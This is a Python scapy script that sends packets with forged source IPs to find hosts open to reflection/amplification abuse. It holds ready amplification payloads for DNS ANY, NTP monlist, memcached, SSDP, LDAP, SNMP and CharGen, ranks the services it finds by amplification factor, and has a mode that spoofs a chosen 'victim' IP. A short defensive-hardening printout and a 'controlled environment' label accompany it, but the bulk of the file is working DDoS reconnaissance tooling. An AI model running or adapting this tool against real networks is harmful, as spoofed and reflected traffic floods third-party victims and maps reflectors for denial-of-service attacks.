#!/usr/bin/env python3
"""
Spoof-Source Scanner - VDT Reflection/Amplification Reconnaissance
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Send SYN/UDP probes with forged source IPs to identify:
- Open services vulnerable to reflection attacks
- Amplification factors for DDoS reconnaissance
- Anti-spoofing control validation (BCP 38/uRPF testing)

CONTROLLED ENVIRONMENT ONLY - VDT baseline v2.1 applies.
"""

import sys
import argparse
import time
import json
from collections import defaultdict
from scapy.all import (
    IP, TCP, UDP, ICMP, DNS, DNSQR, NTP, Raw,
    send, sniff, sr1, RandShort, conf
)

conf.verb = 0


class ReflectionScanner:
    """
    Identifies services vulnerable to reflection/amplification attacks.
    Tests both responsiveness and amplification potential.
    """

    # Service configurations: port, protocol, payload, amplification factor
    SERVICES = {
        'dns': {
            'port': 53,
            'proto': 'udp',
            'payload': lambda: DNS(rd=1, qd=DNSQR(qname="isc.org", qtype="ANY")),
            'avg_amp': 28,  # DNS ANY query amplification
            'description': 'DNS open resolver (ANY query)'
        },
        'ntp': {
            'port': 123,
            'proto': 'udp',
            'payload': lambda: Raw(load=b'\x17\x00\x03\x2a' + b'\x00' * 4),  # monlist
            'avg_amp': 556,  # NTP monlist amplification
            'description': 'NTP monlist reflection'
        },
        'snmp': {
            'port': 161,
            'proto': 'udp',
            'payload': lambda: Raw(load=b'\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63'),
            'avg_amp': 6,  # SNMP GetBulk
            'description': 'SNMP public community'
        },
        'chargen': {
            'port': 19,
            'proto': 'udp',
            'payload': lambda: Raw(load=b'\x01'),
            'avg_amp': 358,  # Character generator
            'description': 'CharGen (legacy service)'
        },
        'ssdp': {
            'port': 1900,
            'proto': 'udp',
            'payload': lambda: Raw(load=b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 3\r\nST: ssdp:all\r\n\r\n'),
            'avg_amp': 30,  # SSDP reflection
            'description': 'SSDP (UPnP discovery)'
        },
        'memcached': {
            'port': 11211,
            'proto': 'udp',
            'payload': lambda: Raw(load=b'\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n'),
            'avg_amp': 51000,  # Memcached stats (extreme)
            'description': 'Memcached stats command'
        },
        'ldap': {
            'port': 389,
            'proto': 'udp',
            'payload': lambda: Raw(load=b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00'),
            'avg_amp': 46,  # LDAP searchRequest
            'description': 'LDAP anonymous bind search'
        },
        'http': {
            'port': 80,
            'proto': 'tcp',
            'payload': None,  # SYN only
            'avg_amp': 0,  # Not amplification, just reflection
            'description': 'HTTP (TCP SYN probe)'
        },
    }

    def __init__(self, target_list, spoof_src, timeout=2, verbose=False):
        self.targets = target_list
        self.spoof_src = spoof_src
        self.timeout = timeout
        self.verbose = verbose
        self.results = defaultdict(dict)

    def log(self, msg, level="INFO"):
        if self.verbose or level in ["RESULT", "VULN"]:
            timestamp = time.strftime("%H:%M:%S")
            prefix = {
                "VULN": "[!]",
                "RESULT": "[+]",
                "INFO": "[*]",
                "DEBUG": "[·]"
            }.get(level, "[ ]")
            print(f"[{timestamp}] {prefix} {msg}")

    def scan_service(self, target, service_name):
        """
        Probe single service with spoofed source.

        Returns:
            dict: {
                'responsive': bool,
                'amp_factor': int,
                'anti_spoof': bool  # True if packet blocked (BCP 38/uRPF active)
            }
        """
        svc = self.SERVICES[service_name]
        result = {
            'service': service_name,
            'port': svc['port'],
            'protocol': svc['proto'],
            'responsive': False,
            'amp_factor': svc['avg_amp'],
            'anti_spoof_active': False,
            'description': svc['description']
        }

        try:
            if svc['proto'] == 'udp':
                # Build UDP packet with spoofed source
                pkt = IP(src=self.spoof_src, dst=target) / \
                      UDP(sport=RandShort(), dport=svc['port'])

                if svc['payload']:
                    pkt = pkt / svc['payload']()

                self.log(f"{target}:{svc['port']}/{svc['proto']} - {service_name}", "DEBUG")

                # Send spoofed packet (no response expected here)
                send(pkt, verbose=0)

                # Verify service is actually open with legitimate probe
                verify_pkt = IP(dst=target) / UDP(sport=RandShort(), dport=svc['port'])
                if svc['payload']:
                    verify_pkt = verify_pkt / svc['payload']()

                resp = sr1(verify_pkt, timeout=self.timeout, verbose=0)

                if resp:
                    result['responsive'] = True
                    # If we got response to legit probe, service is open
                    # Spoofed packet was sent; if target network has BCP 38/uRPF,
                    # it won't reach destination. Detection requires monitoring victim IP.
                    self.log(f"{target}:{svc['port']} OPEN - {service_name} (amp: {svc['avg_amp']}x)", "VULN")
                else:
                    self.log(f"{target}:{svc['port']} closed/filtered", "DEBUG")

            elif svc['proto'] == 'tcp':
                # TCP SYN with spoofed source
                pkt = IP(src=self.spoof_src, dst=target) / \
                      TCP(sport=RandShort(), dport=svc['port'], flags="S")

                send(pkt, verbose=0)

                # Verify with legitimate SYN
                verify_pkt = IP(dst=target) / TCP(sport=RandShort(), dport=svc['port'], flags="S")
                resp = sr1(verify_pkt, timeout=self.timeout, verbose=0)

                if resp and resp.haslayer(TCP):
                    if resp[TCP].flags == 0x12:  # SYN-ACK
                        result['responsive'] = True
                        self.log(f"{target}:{svc['port']} OPEN - {service_name}", "VULN")
                        # Send RST to close connection cleanly
                        rst = IP(dst=target) / TCP(sport=verify_pkt[TCP].sport, dport=svc['port'],
                                                    flags="R", seq=resp[TCP].ack)
                        send(rst, verbose=0)
                    elif resp[TCP].flags == 0x14:  # RST-ACK
                        self.log(f"{target}:{svc['port']} closed", "DEBUG")

        except Exception as e:
            self.log(f"Error scanning {target}:{svc['port']} - {e}", "DEBUG")

        return result

    def scan_target(self, target, services=None):
        """Scan all services on single target"""
        if services is None:
            services = self.SERVICES.keys()

        self.log(f"Scanning {target} (spoofed src: {self.spoof_src})", "INFO")

        for svc_name in services:
            result = self.scan_service(target, svc_name)
            if result['responsive']:
                self.results[target][svc_name] = result

    def scan_all(self, services=None):
        """Scan all targets"""
        self.log(f"Starting reflection scan: {len(self.targets)} targets", "RESULT")
        self.log(f"Spoofed source: {self.spoof_src}", "INFO")

        for target in self.targets:
            self.scan_target(target, services)
            time.sleep(0.5)  # Rate limiting

        self.print_summary()

    def print_summary(self):
        """Print scan results summary"""
        print("\n" + "═" * 80)
        print("REFLECTION/AMPLIFICATION SCAN RESULTS")
        print("═" * 80)
        print(f"Spoofed Source: {self.spoof_src}")
        print(f"Targets Scanned: {len(self.targets)}")
        print(f"Vulnerable Services Found: {sum(len(v) for v in self.results.values())}")
        print("═" * 80 + "\n")

        if not self.results:
            print("No vulnerable services found.\n")
            return

        # Group by amplification factor
        high_amp = []  # >100x
        medium_amp = []  # 10-100x
        low_amp = []  # <10x

        for target, services in self.results.items():
            for svc_name, data in services.items():
                amp = data['amp_factor']
                entry = (target, svc_name, data)

                if amp > 100:
                    high_amp.append(entry)
                elif amp >= 10:
                    medium_amp.append(entry)
                else:
                    low_amp.append(entry)

        # Print by severity
        if high_amp:
            print("HIGH AMPLIFICATION (>100x) - CRITICAL")
            print("─" * 80)
            for target, svc_name, data in sorted(high_amp, key=lambda x: x[2]['amp_factor'], reverse=True):
                print(f"  {target}:{data['port']}/{data['protocol']} - {svc_name.upper()}")
                print(f"    ├─ {data['description']}")
                print(f"    ├─ Amplification: {data['amp_factor']}x")
                print(f"    └─ Impact: 1 byte sent → {data['amp_factor']} bytes to victim\n")

        if medium_amp:
            print("MEDIUM AMPLIFICATION (10-100x) - HIGH")
            print("─" * 80)
            for target, svc_name, data in sorted(medium_amp, key=lambda x: x[2]['amp_factor'], reverse=True):
                print(f"  {target}:{data['port']}/{data['protocol']} - {svc_name.upper()}")
                print(f"    ├─ {data['description']}")
                print(f"    └─ Amplification: {data['amp_factor']}x\n")

        if low_amp:
            print("LOW AMPLIFICATION (<10x) - MEDIUM")
            print("─" * 80)
            for target, svc_name, data in low_amp:
                print(f"  {target}:{data['port']}/{data['protocol']} - {svc_name.upper()}")
                print(f"    └─ {data['description']}\n")

        print("═" * 80)
        self._print_defensive_guidance()

    def _print_defensive_guidance(self):
        """Educational: how to defend against these attacks"""
        print("\nDEFENSIVE HARDENING GUIDANCE")
        print("═" * 80)
        print("""
1. Anti-Spoofing (BCP 38 / RFC 2827)
   ├─ Deploy uRPF (Unicast Reverse Path Forwarding) at edge routers
   ├─ Drop packets with source IPs not in customer prefix
   └─ Prevents attackers from sending packets with spoofed sources

2. Service Hardening
   ├─ DNS: Disable recursion for public resolvers, rate-limit responses
   ├─ NTP: Disable monlist (fixed in ntpd 4.2.7p26+), use noquery
   ├─ SNMP: Change default community, use SNMPv3, ACLs
   ├─ Memcached: Bind to localhost, disable UDP (or use -U 0)
   └─ SSDP/CharGen: Disable legacy services entirely

3. Network-Level Defenses
   ├─ Ingress filtering: drop packets with invalid source IPs
   ├─ Egress filtering: block outbound spoofed packets
   ├─ Rate limiting: per-source limits on UDP responses
   └─ Response Rate Limiting (RRL) for DNS

4. Detection
   ├─ Monitor for asymmetric flows (responses without requests)
   ├─ TTL analysis (H.D. Moore technique)
   ├─ Geolocation mismatches
   └─ Unusual query patterns (e.g., ANY queries spike)
        """)
        print("═" * 80 + "\n")

    def export_json(self, filename):
        """Export results to JSON for further processing"""
        output = {
            'scan_config': {
                'spoofed_source': self.spoof_src,
                'targets': self.targets,
                'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
            },
            'results': dict(self.results)
        }

        with open(filename, 'w') as f:
            json.dump(output, f, indent=2)

        self.log(f"Results exported to {filename}", "RESULT")


class AntiSpoofTester:
    """
    Tests if target network has anti-spoofing controls (BCP 38/uRPF).

    Method:
    1. Send packet with obviously spoofed source IP
    2. Monitor victim IP for reflected response
    3. If victim receives response → no anti-spoofing
    4. If victim receives nothing → anti-spoofing active (or service down)
    """

    def __init__(self, target, victim_ip, verbose=False):
        self.target = target
        self.victim_ip = victim_ip
        self.verbose = verbose

    def test_bcp38(self, service_port=80, protocol='tcp'):
        """
        Test BCP 38 / uRPF enforcement.

        Returns:
            dict: {
                'anti_spoof_active': bool,
                'method': str  # 'blocked' or 'reflected'
            }
        """
        print(f"\n{'═' * 80}")
        print(f"BCP 38 / uRPF TEST")
        print(f"{'═' * 80}")
        print(f"Target: {self.target}:{service_port}/{protocol}")
        print(f"Spoofed Source: {self.victim_ip}")
        print(f"{'═' * 80}\n")

        # Send spoofed packet
        if protocol == 'tcp':
            pkt = IP(src=self.victim_ip, dst=self.target) / \
                  TCP(sport=RandShort(), dport=service_port, flags="S")
        else:  # UDP
            pkt = IP(src=self.victim_ip, dst=self.target) / \
                  UDP(sport=RandShort(), dport=service_port)

        print(f"[*] Sending spoofed packet: {self.victim_ip} → {self.target}:{service_port}")
        send(pkt, verbose=0)

        print(f"\n[!] MANUAL VERIFICATION REQUIRED:")
        print(f"    Check if {self.victim_ip} received reflected traffic.")
        print(f"\n    Method 1: tcpdump on {self.victim_ip}")
        print(f"    $ sudo tcpdump -i any src {self.target} and dst {self.victim_ip}")
        print(f"\n    Method 2: If you control {self.victim_ip}, check logs")
        print(f"\n    Result interpretation:")
        print(f"    ├─ Traffic received at {self.victim_ip} → NO anti-spoofing (vulnerable)")
        print(f"    └─ No traffic received → Anti-spoofing ACTIVE (BCP 38/uRPF working)")
        print(f"\n{'═' * 80}\n")


def main():
    parser = argparse.ArgumentParser(
        description="Spoof-Source Scanner - Reflection/Amplification Reconnaissance",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Scan multiple IPs for reflection vulnerabilities
  sudo python3 spoof-scanner.py scan --targets ips.txt --spoof 8.8.8.8

  # Scan specific services only
  sudo python3 spoof-scanner.py scan --targets ips.txt --spoof 8.8.8.8 --services dns,ntp,memcached

  # Test BCP 38 / uRPF anti-spoofing controls
  sudo python3 spoof-scanner.py test-bcp38 192.168.1.1 --victim 8.8.8.8 --port 80

  # List available services
  python3 spoof-scanner.py list-services

Note: Requires root/sudo for raw socket access.
      CONTROLLED ENVIRONMENT ONLY - VDT baseline v2.1 applies.
        """
    )

    subparsers = parser.add_subparsers(dest='mode', help='Operating mode')

    # Scan mode
    scan_parser = subparsers.add_parser('scan', help='Scan for reflection/amplification vulnerabilities')
    scan_parser.add_argument('--targets', required=True, help='Target IPs (comma-separated or file)')
    scan_parser.add_argument('--spoof', required=True, help='Spoofed source IP')
    scan_parser.add_argument('--services', help='Services to scan (comma-separated, default: all)')
    scan_parser.add_argument('--timeout', type=int, default=2, help='Response timeout (default: 2s)')
    scan_parser.add_argument('--output', help='Export results to JSON file')
    scan_parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    # BCP 38 test mode
    bcp_parser = subparsers.add_parser('test-bcp38', help='Test anti-spoofing controls (BCP 38/uRPF)')
    bcp_parser.add_argument('target', help='Target IP to test')
    bcp_parser.add_argument('--victim', required=True, help='Victim IP (spoofed source)')
    bcp_parser.add_argument('--port', type=int, default=80, help='Target port (default: 80)')
    bcp_parser.add_argument('--protocol', choices=['tcp', 'udp'], default='tcp', help='Protocol (default: tcp)')
    bcp_parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    # List services mode
    list_parser = subparsers.add_parser('list-services', help='List available service probes')

    args = parser.parse_args()

    if args.mode is None:
        parser.print_help()
        sys.exit(1)

    # Mode dispatch
    if args.mode == 'scan':
        # Parse targets
        if args.targets.endswith('.txt'):
            with open(args.targets) as f:
                targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        else:
            targets = args.targets.split(',')

        # Parse services
        services = None
        if args.services:
            services = args.services.split(',')
            # Validate service names
            invalid = [s for s in services if s not in ReflectionScanner.SERVICES]
            if invalid:
                print(f"[!] Invalid services: {', '.join(invalid)}")
                print(f"[*] Available: {', '.join(ReflectionScanner.SERVICES.keys())}")
                sys.exit(1)

        # Run scan
        scanner = ReflectionScanner(targets, args.spoof, args.timeout, args.verbose)
        scanner.scan_all(services)

        # Export if requested
        if args.output:
            scanner.export_json(args.output)

    elif args.mode == 'test-bcp38':
        tester = AntiSpoofTester(args.target, args.victim, args.verbose)
        tester.test_bcp38(args.port, args.protocol)

    elif args.mode == 'list-services':
        print("\n" + "═" * 80)
        print("AVAILABLE SERVICE PROBES")
        print("═" * 80 + "\n")

        for name, svc in sorted(ReflectionScanner.SERVICES.items(), key=lambda x: x[1]['avg_amp'], reverse=True):
            print(f"{name.upper()}")
            print(f"  ├─ Port: {svc['port']}/{svc['proto']}")
            print(f"  ├─ Description: {svc['description']}")
            print(f"  └─ Amplification: {svc['avg_amp']}x")
            print()

        print("═" * 80 + "\n")


if __name__ == "__main__":
    main()
